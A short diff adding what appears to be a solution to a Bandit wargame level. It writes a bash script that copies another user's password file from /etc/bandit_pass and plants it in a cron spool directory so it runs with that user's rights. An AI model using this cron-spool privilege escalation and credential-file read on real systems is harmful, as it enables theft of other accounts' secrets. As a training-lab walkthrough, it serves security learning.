@@ -1,0 +1,17 @@
+mktemp -d
+
+cd /tmp/<generated> && nano bandit24_pass.sh
+
+write this in:
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.ljEyl6kv1M/password
+
+chmod 777 bandit24_pass && chmod 777 /tmp/<generated>
+
+touch password && chmod 777 password && ls -la
+
+cp bandit24_pass.sh /var/spool/bandit24/foo/bandit24_pass.sh
+
+wait a minute while running this command:
+tail -f password
